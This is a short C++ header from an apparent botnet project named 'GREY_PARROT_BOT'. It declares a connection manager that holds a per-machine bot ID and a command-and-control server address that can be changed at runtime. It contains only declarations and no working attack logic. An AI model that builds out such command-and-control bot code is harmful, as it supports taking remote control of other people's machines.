//
// Created by alsah on 16.03.23.
//

#ifndef GREY_PARROT_BOT_CONNECTIONS_MANAGER_H
#define GREY_PARROT_BOT_CONNECTIONS_MANAGER_H

#include <rtc/rtc.hpp>
#include <memory>

#include "C2ServerChannel.h"


struct ConnectionsManagerConfiguration {

    // bot id is a const computer uuid generated on start
    const std::string &botId;

    // server can be potentially changed in a runtime by request
    std::string c2server;

    explicit ConnectionsManagerConfiguration(const std::string &id) : botId(id) {}
};


class ConnectionsManager {


public:

    explicit ConnectionsManager(ConnectionsManagerConfiguration config);
    ~ConnectionsManager();


    ConnectionsManager(ConnectionsManager&) = delete;
    ConnectionsManager(const ConnectionsManager&) = delete;
    void operator = (const ConnectionsManager&) = delete;
    void operator = (ConnectionsManager) = delete;


    void start();
    void stop();


private:

    ConnectionsManagerConfiguration config;

    std::unique_ptr<C2ServerChannel> c2ServerChannel;

};




#endif //GREY_PARROT_BOT_CONNECTIONS_MANAGER_H
